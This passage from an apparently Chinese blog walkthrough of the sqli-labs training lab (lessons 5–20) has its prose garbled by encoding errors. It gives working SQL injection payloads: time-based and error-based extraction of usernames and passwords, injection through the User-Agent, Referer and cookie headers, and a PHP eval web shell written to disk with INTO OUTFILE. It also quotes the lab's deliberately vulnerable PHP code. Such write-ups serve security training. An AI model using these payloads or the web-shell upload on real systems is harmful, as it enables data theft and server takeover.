column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),8)=&#x27;id&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192412154.png" class><p><code>ç¬¬äºŒä¸ªå­—æ®µä¸ç¬¬ä¸‰ä¸ªå­—æ®µä¸ºusernameã€password</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),8)=&#x27;username&#x27;,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),8)=&#x27;password&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192640873.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192551041.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select username from users limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select password from users limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101193118321.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101193031194.png" class><p><strong><em>skipï¼šåŒæ ·ä½¿ç”¨intruderè¿›è¡Œçˆ†ç ´æ˜¯ä¸€ä¸ªä¸é”™çš„æ‰‹æ®µ</em></strong></p><h2 id="0x06-Less-6-GET-åŒæ³¨å…¥-åŒå¼•å·"><a href="#0x06-Less-6-GET-åŒæ³¨å…¥-åŒå¼•å·" class="headerlink" title="0x06.Less-6 GET åŒæ³¨å…¥ åŒå¼•å·"></a>0x06.Less-6 GET åŒæ³¨å…¥ åŒå¼•å·</h2><p><code>åŒLess5ï¼Œå°†å•å¼•å·æ¢ä¸ºåŒå¼•å·å³å¯</code></p><h2 id="0x07-Less-7-GET-Dumpå‡½æ•°-å¯¼å‡ºæ–‡ä»¶"><a href="#0x07-Less-7-GET-Dumpå‡½æ•°-å¯¼å‡ºæ–‡ä»¶" class="headerlink" title="0x07.Less-7 GET Dumpå‡½æ•° å¯¼å‡ºæ–‡ä»¶"></a>0x07.Less-7 GET Dumpå‡½æ•° å¯¼å‡ºæ–‡ä»¶</h2><p><code>é¦–å…ˆéœ€è¦çŸ¥é“webåå°çš„è·¯å¾„æ ¼å¼ï¼Œè¿™é‡Œä½¿ç”¨Less-1ï¼Œèœç‹—çš„æˆ‘æ²¡æœ‰æƒ³åˆ°å…¶ä»–å¥½åŠæ³•.....</code></p><blockquote><p>IISé»˜è®¤è·¯å¾„æ˜¯    C:\Inetpub\wwwroot</p><p>nginxä¸€èˆ¬æ˜¯    /usr/local/nginx/htmlï¼Œ/home/wwwroot/defaultï¼Œ/usr/share/nginxï¼Œ/var/www/htmç­‰</p><p>apacheæ˜¯    /var/www/htmlï¼Œ/var/www/html/htdocs</p><p>phpstudy å°±æ˜¯    \PhpStudy\WWW\</p><p>xammp å°±æ˜¯    \xampp\htdocs</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,@@basedir,@@datadir -- -</span><br></pre></td></tr></table></figure><blockquote><p>å…¶ä¸­basedirä¸ºMySQL çš„å®‰è£…è·¯å¾„ï¼Œdatadirä¸ºMySQL çš„æ•°æ®åº“æ–‡ä»¶è·¯å¾„</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101215105882.png" class><p><code>å¯ä»¥çŒœåˆ°webè·¯å¾„ä¸ºC:\phpstudy\wwwï¼Œä¹‹åå°±å¯ä»¥ä¸Šä¼ æ–‡ä»¶</code></p><p><code>è¿™é‡Œå·²ç»æ¢æµ‹åˆ°é—­åˆå­—ç¬¦ä¸º&#39;))</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-7/?id=0&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;demo&quot;]);?&gt;&#x27; into outfile &quot;C:\\phpStudy\\www\\sqli\\less-7\\demo.php&quot; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220528860.png" class><p><code>è®¿é—®demo.phpæŸ¥çœ‹æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸ</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220623654.png" class><p><code>ä¸Šä¼ æˆåŠŸï¼Œèšå‰‘è¿æ¥</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220848719.png" class><h2 id="0x08-Less-8-GET-åŸºäºbool-ç›²æ³¨-å•å¼•å·"><a href="#0x08-Less-8-GET-åŸºäºbool-ç›²æ³¨-å•å¼•å·" class="headerlink" title="0x08.Less-8 GET åŸºäºbool ç›²æ³¨ å•å¼•å·"></a>0x08.Less-8 GET åŸºäºbool ç›²æ³¨ å•å¼•å·</h2><blockquote><p>åŒLess5 æ–¹æ³•äºŒ</p></blockquote><h2 id="0x09-Less-9-GET-åŸºäºæ—¶é—´-ç›²æ³¨-å•å¼•å·"><a href="#0x09-Less-9-GET-åŸºäºæ—¶é—´-ç›²æ³¨-å•å¼•å·" class="headerlink" title="0x09.Less-9 GET åŸºäºæ—¶é—´ ç›²æ³¨ å•å¼•å·"></a>0x09.Less-9 GET åŸºäºæ—¶é—´ ç›²æ³¨ å•å¼•å·</h2><p><code>æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½åªæœ‰You are in...</code></p><blockquote><p>åŒLess5 æ–¹æ³•ä¸‰</p></blockquote><h2 id="0x010-Less-10-GET-åŸºäºæ—¶é—´-ç›²æ³¨-åŒå¼•å·"><a href="#0x010-Less-10-GET-åŸºäºæ—¶é—´-ç›²æ³¨-åŒå¼•å·" class="headerlink" title="0x010.Less-10 GET åŸºäºæ—¶é—´ ç›²æ³¨ åŒå¼•å·"></a>0x010.Less-10 GET åŸºäºæ—¶é—´ ç›²æ³¨ åŒå¼•å·</h2><blockquote><p>åŒLess9ï¼Œå°†å•å¼•å·æ¢ä¸ºåŒå¼•å·</p></blockquote><h2 id="0x011-Less-11-POST-åŸºäºæŠ¥é”™-å•å¼•å·"><a href="#0x011-Less-11-POST-åŸºäºæŠ¥é”™-å•å¼•å·" class="headerlink" title="0x011.Less-11 POST åŸºäºæŠ¥é”™ å•å¼•å·"></a>0x011.Less-11 POST åŸºäºæŠ¥é”™ å•å¼•å·</h2><p><code>unameå­˜åœ¨æ³¨å…¥</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100217440.png" class><p><code>æµ‹è¯•å‘ç°åªå­˜åœ¨ä¸¤ä¸ªå­—æ®µ</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100626749.png" class><p><code>ä¸¾ä¸ªæ —å­</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100826775.png" class><blockquote><p>å…¶ä»–æ–¹æ³•å¦‚Less-1</p></blockquote><h2 id="0x12-Less-12-POST-åŸºäºæŠ¥é”™-åŒå¼•å·-æ‹¬å·"><a href="#0x12-Less-12-POST-åŸºäºæŠ¥é”™-åŒå¼•å·-æ‹¬å·" class="headerlink" title="0x12.Less-12 POST åŸºäºæŠ¥é”™ åŒå¼•å·+æ‹¬å·"></a>0x12.Less-12 POST åŸºäºæŠ¥é”™ åŒå¼•å·+æ‹¬å·</h2><p><code>åŒLess-11ï¼Œåªéœ€è¦å°†å•å¼•å·æ¢ä¸ºåŒå¼•å·åŠ æ‹¬å·å³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) -- -&amp;passwd=pass&amp;submit=Submit</span><br></pre></td></tr></table></figure><h2 id="0x13-Less-13-POST-åŒæ³¨å…¥-å•å¼•å·-æ‹¬å·"><a href="#0x13-Less-13-POST-åŒæ³¨å…¥-å•å¼•å·-æ‹¬å·" class="headerlink" title="0x13.Less-13 POST åŒæ³¨å…¥ å•å¼•å·+æ‹¬å·"></a>0x13.Less-13 POST åŒæ³¨å…¥ å•å¼•å·+æ‹¬å·</h2><p><code>åŒLess-5</code></p><blockquote><p>æ–¹æ³•ä¸€ã€äºŒã€ä¸‰å‡å¯ç”¨</p></blockquote><p><code>æ–¹æ³•1</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110042606.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110103120999.png" class><p><code>æ–¹æ³•äºŒ</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110308320.png" class><p><code>æ–¹æ³•ä¸‰</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110528568.png" class><h2 id="0x14-Less-14-POST-åŒæ³¨å…¥-åŒå¼•å·"><a href="#0x14-Less-14-POST-åŒæ³¨å…¥-åŒå¼•å·" class="headerlink" title="0x14.Less-14 POST åŒæ³¨å…¥ åŒå¼•å·"></a>0x14.Less-14 POST åŒæ³¨å…¥ åŒå¼•å·</h2><blockquote><p>åŒLess-13ï¼Œå°†å•å¼•å·+æ‹¬å·æ¢ä¸ºåŒå¼•å·å³å¯</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111000136.png" class><h2 id="0x15-Less-15-POST-åŸºäºæ—¶é—´-boolç›²æ³¨-å•å¼•å·"><a href="#0x15-Less-15-POST-åŸºäºæ—¶é—´-boolç›²æ³¨-å•å¼•å·" class="headerlink" title="0x15.Less-15 POST åŸºäºæ—¶é—´/boolç›²æ³¨ å•å¼•å·"></a>0x15.Less-15 POST åŸºäºæ—¶é—´/boolç›²æ³¨ å•å¼•å·</h2><p><code>åŒLess-5çš„æ–¹æ³•äºŒä¸æ–¹æ³•ä¸‰</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111527544.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111652045.png" class><h2 id="0x16-Less-1-POST-åŸºäºæ—¶é—´-boolç›²æ³¨-åŒå¼•å·-æ‹¬å·"><a href="#0x16-Less-1-POST-åŸºäºæ—¶é—´-boolç›²æ³¨-åŒå¼•å·-æ‹¬å·" class="headerlink" title="0x16.Less-1 POST åŸºäºæ—¶é—´/boolç›²æ³¨ åŒå¼•å·+æ‹¬å·"></a>0x16.Less-1 POST åŸºäºæ—¶é—´/boolç›²æ³¨ åŒå¼•å·+æ‹¬å·</h2><blockquote><p>åŒLess-15ï¼Œå°†å•å¼•å·æ¢ä¸ºåŒå¼•å·+æ‹¬å·å³å¯</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110112154590.png" class><h2 id="0x17-Less-17-POST-åŸºäºé”™è¯¯-æ›´æ–°æŸ¥è¯¢"><a href="#0x17-Less-17-POST-åŸºäºé”™è¯¯-æ›´æ–°æŸ¥è¯¢" class="headerlink" title="0x17.Less-17 POST åŸºäºé”™è¯¯ æ›´æ–°æŸ¥è¯¢"></a>0x17.Less-17 POST åŸºäºé”™è¯¯ æ›´æ–°æŸ¥è¯¢</h2><p><code>æŸ¥çœ‹æºç å‘ç°ï¼Œå½“unameçš„å€¼åé¢æœ‰ç‰¹æ®Šç¬¦å·ä¼šåŠ ä¸Šä¸€ä¸ª/è¿›è¡Œè½¬ä¹‰</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æ ¹æ®é¢˜ç›®æç¤ºä¸æºç æ¨æµ‹passwdä¸ºæ³¨å…¥ç‚¹</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110114238770.png" class><p><code>payloadåŒLess-5çš„æ–¹æ³•ä¸€</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110120051232.png" class><p><code>è¿™é‡Œç›´æ¥ä½¿ç”¨ä»¥ä¸‹payloadä¼šæŠ¥é”™ï¼Œusersä¸èƒ½è¢«ä¿®æ”¹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110122233780.png" class><p><code>å¯¹payloadè¿›è¡ŒåµŒå¥—ï¼Œä¿®æ”¹ä¸ºå¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select password from (select password from users limit 0,1) as demo),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110122126131.png" class><p><code>å…¶ä»–æ³¨å…¥ä¸åœ¨èµ˜è¿°</code></p><h2 id="0x18-Less-18-POST-åŸºäºæŠ¥é”™-HTTPè¯·æ±‚å¤´-Uagent-field"><a href="#0x18-Less-18-POST-åŸºäºæŠ¥é”™-HTTPè¯·æ±‚å¤´-Uagent-field" class="headerlink" title="0x18.Less-18 POST åŸºäºæŠ¥é”™ HTTPè¯·æ±‚å¤´ Uagent-field"></a>0x18.Less-18 POST åŸºäºæŠ¥é”™ HTTPè¯·æ±‚å¤´ Uagent-field</h2><p><code>æŸ¥çœ‹æºç </code></p><blockquote><p>å¯ä»¥å‘ç°ï¼Œè¿™é‡Œçš„$unameä¸$passwdéƒ½åšäº†è¿‡æ»¤ï¼Œå³å½“å­˜åœ¨ç‰¹æ®Šå­—ç¬¦æ—¶åŠ ä¸Š/è¿›è¡Œè½¬ä¹‰</p><p>å¹¶ä¸”insertå‡½æ•°å°†Uagentæ’å…¥åˆ°äº†æ•°æ®åº“</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $uagent = $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    $IP = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">//echo &#x27;Your User Agent is: &#x27; .$uagent;</span></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">    $uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    $passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    echo &#x27;Your Your User name:&#x27;. $uname;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your Password:&#x27;. $passwd;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your User Agent String:&#x27;. $uagent;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your User Agent String:&#x27;. $IP;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//logging the connection parameters to a file for analysis.    </span></span><br><span class="line">    $fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    fwrite($fp,<span class="string">&#x27;User Agent:&#x27;</span>.$uname.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    fclose($fp);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    $sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">    $result1 = mysql_query($sql);</span><br><span class="line">    $row1 = mysql_fetch_array($result1);</span><br><span class="line">        <span class="keyword">if</span>($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            $insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br><span class="line">            mysql_query($insert);</span><br><span class="line">            <span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;    </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>æ‰€ä»¥ä½¿ç”¨å¦‚ä¸‹payload</code></p><blockquote><p>updatexmlä¸extractvalueä½œç”¨ç›¸åŒ</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><br><span class="line">andä¸oréƒ½å¯ä»¥ï¼Œåªæ˜¯ä¸ºäº†é—­åˆå•å¼•å·</span><br></pre></td></tr></table></figure><p><code>æœåŠ¡å™¨æ‰§è¡Œçš„å‘½ä»¤å¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=&#x27;admin&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;&#x27; and users.password=&#x27;&#x27; ORDER BY users.id DESC LIMIT 0,1&quot;</span></span></span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110124944874.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110133641590.png" class><h2 id="0x19-Less-19-POST-åŸºäºæŠ¥é”™-HTTPè¯·æ±‚å¤´-Referer-field"><a href="#0x19-Less-19-POST-åŸºäºæŠ¥é”™-HTTPè¯·æ±‚å¤´-Referer-field" class="headerlink" title="0x19.Less-19 POST åŸºäºæŠ¥é”™ HTTPè¯·æ±‚å¤´ Referer-field"></a>0x19.Less-19 POST åŸºäºæŠ¥é”™ HTTPè¯·æ±‚å¤´ Referer-field</h2><p><code>åŒLess18ï¼Œåªæ˜¯æ³¨å…¥ç‚¹å˜ä¸ºreferer</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110125136890.png" class><h2 id="0x20-Less-20-POST-åŸºäºæŠ¥é”™-cookieæ³¨å…¥"><a href="#0x20-Less-20-POST-åŸºäºæŠ¥é”™-cookieæ³¨å…¥" class="headerlink" title="0x20.Less-20 POST åŸºäºæŠ¥é”™ cookieæ³¨å…¥"></a>0x20.Less-20 POST åŸºäºæŠ¥é”™ cookieæ³¨å…¥</h2><p><code>æ³¨å…¥ç‚¹ä¸ºcookieï¼Œæ–¹æ³•åŒLess-1</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; order by 3 -- -</span><br><span class="line">uname=admin&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110130119066.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110130152559.png" class><p><strong><em>skip:deciduous_tree:</em></strong></p>]]></content>
    
    
